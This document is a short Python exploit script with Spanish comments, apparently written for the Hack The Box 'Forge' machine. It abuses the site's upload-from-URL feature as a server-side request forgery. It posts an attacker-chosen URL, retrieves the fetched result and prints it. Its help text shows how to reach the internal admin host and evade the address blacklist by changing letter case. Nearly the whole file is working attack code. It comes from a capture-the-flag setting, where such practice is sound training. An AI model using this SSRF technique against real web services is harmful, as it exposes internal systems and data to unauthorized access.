#!/usr/bin/python3

import requests
import sys
import re

# Variables globales
URL = "http://forge.htb"

# Clases del programa
class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    WHITE = '\033[1;37m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Funciones del programa
def main():
    url_to_upload = sys.argv[1]

    data_post = {"url":url_to_upload,"remote":"1"}
    r = requests.post(URL + '/upload', data=data_post)

    try:
        url_with_response = re.findall(r'<strong><a href="(.*?)"', r.text)[0]
    except:
        #print(r.text) # por si no me crees :P acá te muestra el error completo
        print("\n[-] " + Color.RED + "Obtuviste alguno de estos errores:\n" + Color.END)
        print("> 'An error occured! Error : HTTPConnectionPool(host=..)...' o sea, valida IP o conexión.")
        print("> 'URL contains a blacklisted address!', juega con las letras y bypassea la lista negra.")
        print("> 'Invalid protocol! Supported protocols: http, https'. Ta clarito.")
        print("\nValida!")
        exit(1)

    r = requests.get(url_with_response)

    if "404 Not Found" in r.text or "500 Internal Server" in r.text:
        print("\n[-] " + Color.RED + "Error extrayendo info de esa URL, validala...\n" + Color.END)
        exit(1)

    print(r.text.rstrip())

def print_help():  # mostramos como usar el programa
    print(f"uso: {sys.argv[0]} <URLtoUPLOAD>")
    print("\nOpciones:")
    print("  <URLtoUPLOAD>    URL con el 'archivo' que quieres 'subir' (o ver :O (SSRF))")
    print("\nEjemplo:")
    print(f"  {sys.argv[0]} http://10.10.14.156:8000/hola.txt")
    print(f"  {sys.argv[0]} http://foRge.htb/static/js/main.js")
    print(f"  {sys.argv[0]} http://admin.foRge.htb/upload?u=http://10.10.14.156:8000/hola.txt")
    exit(1)

def arguments():  # validamos parametros que recibimos
    if len(sys.argv) != 2:
        print_help()

if '__main__' == __name__:
    arguments()
    main()
